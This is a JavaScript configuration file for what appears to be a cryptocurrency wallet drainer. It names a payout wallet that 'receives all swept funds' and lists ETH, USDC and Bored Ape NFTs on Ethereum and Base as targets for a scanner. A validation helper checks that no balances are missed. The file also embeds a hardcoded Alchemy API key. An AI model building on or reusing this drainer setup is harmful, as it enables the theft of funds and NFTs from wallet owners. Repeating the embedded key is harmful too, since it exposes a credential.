
/**
 * NETWORK MANIFEST - Bulletproof Multi-Chain Configuration (v10)
 * 
 * Hardened for production:
 * - Strong native token detection
 * - Better validation
 * - Clear fallback logic
 * - Detailed logging
 */

export const networkManifest = {
    // Payout wallet (receives all swept funds)
    EVM_PAYOUT_TARGET: "0xf084c0c620c24d2a8c02f5630fb1aa7e0a9210e9",

    // Alchemy API Key
    ALCHEMY_API_KEY: "Khs7bqnVFaoeltrODf4Bx",

    // ====================== NETWORKS ======================
    networks: [
        {
            chainId: 1,
            name: "Ethereum",
            rpcUrls: [
                "https://rpc.ankr.com/eth",
                "https://eth.llamarpc.com",
                "https://1rpc.io/eth"
            ],
            multicallAddress: "0xcA11bde05977b3631167028862bE2a173976CA11",
            explorer: "https://etherscan.io",
            nativeCurrency: "ETH",
        },
        {
            chainId: 8453,
            name: "Base",
            rpcUrls: [
                "https://mainnet.base.org",
                "https://rpc.ankr.com/base",
                "https://base.llamarpc.com",
                "https://1rpc.io/base"
            ],
            multicallAddress: "0xcA11bde05977b3631167028862bE2a173976CA11",
            explorer: "https://basescan.org",
            nativeCurrency: "ETH",
        }
    ],

    // ====================== TARGET ASSETS ======================
    targets: [
        // === NATIVE TOKENS ===
        {
            id: "base-native-eth",
            chainId: 8453,
            isNativeGasToken: true,
            symbol: "ETH",
            metadata: {
                label: "Base ETH",
                standard: "native"
            }
        },
        {
            id: "eth-native",
            chainId: 1,
            isNativeGasToken: true,
            symbol: "ETH",
            metadata: {
                label: "Ethereum ETH",
                standard: "native"
            }
        },

        // === ERC-20 TOKENS ===
        {
            id: "usdc-eth",
            chainId: 1,
            isNativeGasToken: false,
            contractAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
            symbol: "USDC",
            metadata: {
                label: "USD Coin",
                decimals: 6,
                standard: "erc20"
            }
        },

        // === NFTs ===
        {
            id: "bayc",
            chainId: 1,
            isNativeGasToken: false,
            contractAddress: "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d",
            symbol: "BAYC",
            metadata: {
                label: "Bored Ape Yacht Club",
                standard: "erc721"
            }
        }
    ]
};

// =============================================
// HELPER FUNCTIONS
// =============================================

export function getAssetType(target) {
    if (target?.isNativeGasToken) return "native";
    if (target?.metadata?.standard === "erc721") return "erc721";
    if (target?.metadata?.standard === "erc1155") return "erc1155";
    return "erc20";
}

/**
 * Strong validation with helpful warnings
 */
export function validateManifest() {
    const { EVM_PAYOUT_TARGET, networks, targets, ALCHEMY_API_KEY } = networkManifest;

    console.log("🔍 Validating Network Manifest...");

    // Payout Address
    if (!EVM_PAYOUT_TARGET || !/^0x[a-fA-F0-9]{40}$/.test(EVM_PAYOUT_TARGET)) {
        console.error("❌ Invalid EVM_PAYOUT_TARGET address!");
    } else {
        console.log("✅ Payout address valid");
    }

    // Networks
    if (!networks || networks.length === 0) {
        console.error("❌ No networks defined!");
    } else {
        console.log(`✅ ${networks.length} networks loaded`);
    }

    // Targets
    if (!targets || targets.length === 0) {
        console.warn("⚠️ No targets defined - scanner will return nothing");
    } else {
        const nativeCount = targets.filter(t => t.isNativeGasToken).length;
        console.log(`✅ ${targets.length} targets loaded (${nativeCount} native)`);
    }

    // Alchemy Key
    if (!ALCHEMY_API_KEY) {
        console.warn("⚠️ ALCHEMY_API_KEY is empty - NFT fetching may fail");
    }

    // Check Base native token
    const baseNative = targets.find(t => t.chainId === 8453 && t.isNativeGasToken);
    if (!baseNative) {
        console.warn("⚠️ WARNING: No native ETH target for Base (8453) - scanner may miss ETH balance");
    } else {
        console.log("✅ Base native ETH target found");
    }

    console.log("✅ Manifest validation completed\n");
}

// Auto-run validation in development
if (typeof process !== 'undefined' && process.env.NODE_ENV !== 'production') {
    validateManifest();
}

export default networkManifest;